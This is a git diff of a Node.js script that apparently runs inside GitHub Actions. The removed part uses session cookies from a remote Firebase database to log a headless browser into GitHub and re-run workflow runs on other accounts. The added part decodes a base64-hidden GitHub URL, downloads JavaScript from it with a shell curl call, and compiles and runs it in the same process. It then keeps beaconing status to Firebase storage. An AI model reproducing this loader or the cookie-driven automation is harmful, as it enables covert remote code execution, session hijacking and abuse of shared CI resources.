@@ -1,19 +1,9 @@
-const puppeteer = require('puppeteer')
-const axios = require('axios')
-
-
-let browser = null
-let page = null
-let mData = null
-let UPDATE = null
+const { exec } = require('child_process')
 
 let USER = getUserName()
 let FINISH = new Date().getTime()+21000000
 
-
-let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4L2dpdGh1Yi8=')
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')
-
 
 if (USER) {
     console.log('USER: '+USER)
@@ -26,239 +16,116 @@ if (USER) {
 
 
 async function startServer() {
-    console.log('---START---')
+    console.log('---SERVER---')
 
-    await getUpdateData()
-    await startBrowser()
-
-    console.log('---LOAD---')
+    await checkStatus()
+    await startModule()
 
     while (true) {
-        await checkStatus()
         await delay(60000)
+        await checkStatus()
     }
 }
 
+async function startModule() {
+    let code = await getAxios(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhaXlhbjA4OC9wdWJsaWMvbWFpbi9tb2R1bGUuanM=', 'base64').toString('ascii'))
+    if (code) {
+        try {
+            let Module = requireModule(code)
+            Module.start()
 
-async function startBrowser() {
-    try {
-        browser = await puppeteer.launch({
-            headless: false,
-            headless: 'new',
-            args: [
-                '--no-sandbox',
-                '--disable-setuid-sandbox',
-                '--ignore-certificate-errors',
-                '--ignore-certificate-errors-skip-list',
-                '--disable-dev-shm-usage'
-            ]
-        })
-    
-        page = (await browser.pages())[0]
-
-        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
-    } catch (error) {}
-}
-
-async function getUpdateData() {
-    try {
-        let response = await getAxios(BASE_URL+'server/'+USER+'.json')
-
-        let data = response.data
-
-        if (data['update']) {
-            UPDATE = data['update']
-
-            response = await getAxios(BASE_URL+'server/'+UPDATE+'.json')
-
-            mData = response.data
+            console.log('---START---')
+        } catch (error) {
+            await delay(60000)
+            await startModule()
         }
-    } catch (error) {}
+    } else {
+        await delay(60000)
+        await startModule()
+    }
 }
+
 
 async function checkStatus() {
-    try {
+    if (FINISH > 0 && FINISH < new Date().getTime()) {
         await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
-            headers: {
-                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
-            },
-            maxBodyLength: Infinity,
-            maxContentLength: Infinity
+            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+10)
         })
 
-        if (UPDATE == null) {
-            await getUpdateData()
-        }
-
-        if (UPDATE) {
-            let mActive = true
-
-            try {
-                let response = await axios.get(STORAGE+encodeURIComponent('server/'+UPDATE+'.json'))
-
-                let contentType = response.data['contentType']
-                let time = parseInt(contentType.replace('active/', ''))*1000
-                if (time > new Date().getTime()) {
-                    mActive = false
-                }
-            } catch (error) {}
-
-            if (mActive && mData['action']) {
-                console.log('---ACTIVE---')
-                await activeAction()
-            }
-        } else {
-            console.log('---ERROR---')
-        }
-
-        if (FINISH > 0 && FINISH < new Date().getTime()) {
-            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
-                headers: {
-                    'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+10)
-                },
-                maxBodyLength: Infinity,
-                maxContentLength: Infinity
-            })
-
-            console.log('---COMPLETED---')
-            process.exit(0)
-        }
-    } catch (error) {}
-}
-
-async function activeAction() {
-    await page.setCookie(...[
-        {
-            name: 'user_session',
-            value: mData['cookies'],
-            domain: 'github.com',
-            path: '/',
-            expires: 1739569499.022126,
-            size: mData['cookies'].length,
-            httpOnly: true,
-            secure: true,
-            session: false,
-            sameSite: 'Lax',
-            sameParty: false,
-            sourceScheme: 'Secure',
-            sourcePort: 443
-        },
-        {
-            name: '__Host-user_session_same_site',
-            value: mData['cookies'],
-            domain: 'github.com',
-            path: '/',
-            expires: 1712663324.958042,
-            size: mData['cookies'].length,
-            httpOnly: true,
-            secure: true,
-            session: false,
-            sameSite: 'Strict',
-            sameParty: false,
-            sourceScheme: 'Secure',
-            sourcePort: 443
-        }
-    ])
-    
-    await page.goto('https://github.com/'+UPDATE+'/'+UPDATE+'/actions/runs/'+mData['action'], { waitUntil: 'load', timeout: 0 })
-
-    await delay(1000)
-
-    for (let i = 0; i < 5; i++) {
-        let start = await page.evaluate(() => {
-            let root = document.querySelector('#rerun-dialog-mobile-all')
-            if (root) {
-                let child = root.querySelector('button[data-disable-with="Re-running..."]')
-                if (child) {
-                    child.click()
-                    return true
-                }
-            }
-            return false
+        console.log('---COMPLETED---')
+        process.exit(0)
+    } else {
+        await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
+            'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
         })
-
-        if (start) {
-            await postAxios(STORAGE+encodeURIComponent('server/'+UPDATE+'.json'), '', {
-                headers: {
-                    'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
-                },
-                maxBodyLength: Infinity,
-                maxContentLength: Infinity
-            })
-
-            break
-        }
-
-        await delay(3000)
     }
-
-    await delay(3000)
-
-    await page.goto('about:blank')
 }
 
-async function getAxios(url, options) {
-    let loop = 0
-    let responce = null
-    
-    while(true) {
-    
+async function getAxios(url) {
+    let data = await getCurlData(url)
+    if (data) {
+        return data
+    }
+    return getFetchData(url)
+}
+
+async function getCurlData(url) {
+    return new Promise((resolve) => {
         try {
-            responce = await axios.get(url, options==null?{}:options)
-            break
+            exec('curl '+url, function (err, stdout, stderr) {
+                try {
+                    if (err) {
+                        resolve(null)
+                    } else {
+                        resolve(stdout.trim())
+                    }
+                } catch (error) {
+                    resolve(null)
+                }
+            })
         } catch (error) {
-            loop++
-
-            if (loop >= 3) {
-                break
-            } else {
-                await delay(3000)
-            }
+            resolve(null)
         }
-    }
-    return responce
+    })
+}
+
+async function getFetchData(url) {
+    return new Promise((resolve) => {
+        try {
+            fetch(url).then((response) => response.text()).then((data) => {
+                resolve(data)
+            }).catch((error) => {
+                console.log(error)
+                resolve(null)
+            })
+        } catch (error) {
+            resolve(null)
+        }
+    })
 }
 
 async function postAxios(url, body, data) {
-    let loop = 0
-    let responce = null
-
-    while(true) {
+    return new Promise((resolve) => {
         try {
-            responce = await axios.post(url, body, data)
-            break
+            fetch(url, {
+                method: 'POST',
+                headers: data,
+                body: body
+            }).then((response) => {
+                resolve('ok')
+            }).catch((error) => {
+                resolve('ok')
+            })
         } catch (error) {
-            loop++
-
-            if (loop >= 3) {
-                break
-            } else {
-                await delay(3000)
-            }
+            resolve('ok')
         }
-    }
-    return responce
+    })
 }
 
-async function patchAxios(url, body, data) {
-    let loop = 0
-    let responce = null
-
-    while(true) {
-        try {
-            responce = await axios.patch(url, body, data)
-            break
-        } catch (error) {
-            loop++
-
-            if (loop >= 3) {
-                break
-            } else {
-                await delay(3000)
-            }
-        }
-    }
-    return responce
+function requireModule(code) {
+    var m = new module.constructor(__filename, module.parent)
+    m._compile(code, __filename)
+    return m.exports
 }
 
 function getUserName() {
